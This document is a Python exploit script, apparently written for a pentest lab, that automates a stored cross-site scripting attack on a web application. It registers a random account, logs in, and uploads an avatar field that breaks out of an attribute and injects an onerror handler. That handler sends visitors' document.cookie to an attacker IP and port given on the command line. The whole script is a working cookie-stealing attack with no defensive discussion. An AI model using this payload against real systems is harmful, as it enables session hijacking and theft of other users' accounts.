#!/usr/bin/python3

import requests
import sys
import random
import string
from random_word import RandomWords


proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
  
def main():
    if len(sys.argv) < 4:
        print("[+]Syntax for program: %s [target ip] [attacker ip] [attacker port]" % sys.argv[0])
        print("[+]i.e. %s 192.168.177.162 192.168.119.177 4444" %sys.argv[0])
        exit()


    target_ip = sys.argv[1]
    attacker_ip = sys.argv[2]
    attacker_port = sys.argv[3]

    random_word = RandomWords()
    email = random_word.get_random_word() + "@email.com"
    password = "vader"
    
    print("-----------------------------------------\n")
    print("[+]Creating a user with creds %s : %s" %(email,password))
    create_account_url = "http://" + target_ip + "/register"
    response=requests.post(create_account_url,data={'name':'name','email':email,'password':password})
    if "You are now registered" in response.text:
            print ("[+] Account created with credentials email: %s | password:vader" % email)
    else:
        print ("[!] Try again")
        exit()
        

    print("[+]Loggin in a user with creds %s : %s" %(email,password))
    lowpriv_session = requests.Session()
    login_url = "http://%s/login" % target_ip
    rep = lowpriv_session.post(login_url, data={'email':email,'password':password})
    if 'Amount per Invoice' not in rep.text:
        print(rep.text, "Failed login")
        exit()
    
    print("[+] Uploading Avatar, have a listener ready on %s | %s " % (attacker_ip,attacker_port))

    avatar_url = "http://" + target_ip + "/upload-avatar"
    payload = "data:image/jpeg;base64,/9j/4AAQSkZJRgyx\' onerror=\'var i=new Image;i.src=\"http://%s:%s/?\"+document.cookie;" %(attacker_ip,attacker_port)
    
    print(avatar_url)

    lowpriv_session.post(avatar_url, files= {'avatar':f"""data:image/jpeg;base64,/9j/4AAQSkZJ' onerror='var i=new Image;i.src="http://{attacker_ip}:{attacker_port}/?"+document.cookie;"""})
  


main()
